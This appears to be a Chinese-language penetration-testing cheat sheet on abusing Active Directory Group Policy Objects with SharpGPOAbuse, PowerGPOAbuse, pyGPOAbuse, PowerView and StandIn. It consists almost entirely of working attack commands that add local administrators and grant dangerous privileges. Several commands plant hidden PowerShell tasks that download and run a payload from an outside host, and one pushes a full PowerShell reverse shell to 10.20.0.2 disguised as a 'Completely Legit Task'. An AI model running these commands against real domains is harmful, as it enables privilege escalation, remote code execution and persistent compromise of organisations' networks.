	GPO 的创建者被自动授予显式编辑设置、删除、修改安全性，表现为 CreateChild、DeleteChild、Self、WriteProperty、DeleteTree、Delete、GenericRead、WriteDacl、WriteOwner
	GPO 优先级：组织单位 > 域 > 站点 > 本地
  ### 查找易受攻击的 GPO
	查看具有写入权限的 GPLink
	>Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
  ### SharpGPOAbuse
	构建和配置 SharpGPOAbuse
	>git clone https://github.com/FSecureLABS/SharpGPOAbuse
	>Install-Package CommandLineParser -Version 1.9.3.15
	>ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
	添加用户权限
	>.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
	添加本地管理员
	>.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
	配置用户或计算机登录脚本
	>.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
	配置计算机或用户即时任务
	旨在每次 GPO 刷新“运行一次”，而不是每个系统运行一次
	>.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
	>.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
  ### PowerGPOAbuse
  	https://github.com/rootSySdk/PowerGPOAbuse
	PS> . .\PowerGPOAbuse.ps1
	添加本地管理员 
	PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
	分配新的权限 
	PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
	添加新的计算机/用户脚本
	PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
	创建一个即时任务
	PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
  ### pyGPOAbuse
  	>git clone https://github.com/Hackndo/pyGPOAbuse
	将 john 用户添加到本地管理员组（密码：H4x00r123..）
	>./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
	反弹shell
	>./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
	    -powershell \ 
	    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
	    -taskname "Completely Legit Task" \
	    -description "Dis is legit, pliz no delete" \ 
	    -user
  ### PowerView
  	>Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
	>New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
  ### StandIn
  	>StandIn.exe --gpo --filter Shards --localadmin user002
	>StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
	>StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"